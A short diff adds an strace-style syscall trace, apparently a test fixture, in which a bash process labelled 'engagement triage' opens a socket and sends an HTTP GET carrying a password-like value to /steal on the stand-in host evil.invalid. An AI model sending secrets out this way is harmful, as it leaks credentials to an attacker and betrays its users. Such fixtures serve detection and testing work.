@@ -1,0 +1,5 @@
+1757200002.050000 execve("/usr/bin/bash", ["/usr/bin/bash", "-lc", "engagement triage"], /* 5 vars */) = 0 <0.000412>
+1757200007.000000 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3<socket:[12345]>
+1757200008.000000 write(3<TCP:[10.10.0.9:55000]>, "GET /steal?pwd=Vv4RotMark9kPq2Zx7 HTTP/1.1\r\nHost: evil.invalid\r\n\r\n", 58) = 58 <0.000100>
+1757200019.950000 exit_group(0)     = 0
+1757200019.960000 +++ exited with 0 +++
